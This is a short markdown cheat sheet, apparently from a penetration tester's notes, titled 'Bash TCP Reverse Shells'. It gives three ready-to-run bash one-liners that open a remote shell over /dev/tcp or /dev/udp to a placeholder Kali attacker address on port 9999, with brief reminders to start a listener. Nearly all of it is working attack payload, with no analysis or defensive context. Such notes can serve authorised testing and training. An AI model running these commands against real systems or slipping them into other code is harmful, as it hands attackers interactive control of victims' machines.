---
title: 
tags:
---
## Bash TCP Reverse Shells
These TCP reverse shells will attempt to make a connection to your KALI machine using port 9999. Make sure to setup a TCP Listener.

```bash
sh -i >& /dev/tcp/KALI_IP/9999 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/KALI_IP/9999; sh <&196 >&196 2>&196
```
## Bash UDP Reverse Shell
The UDP shells will attempt to make a connection to your KALI machine using port 9999. Make sure to setup a UDP Listener.

```bash
sh -i >& /dev/udp/KALI_IP/9999 0>&1
```

---
### Supporting Content
- 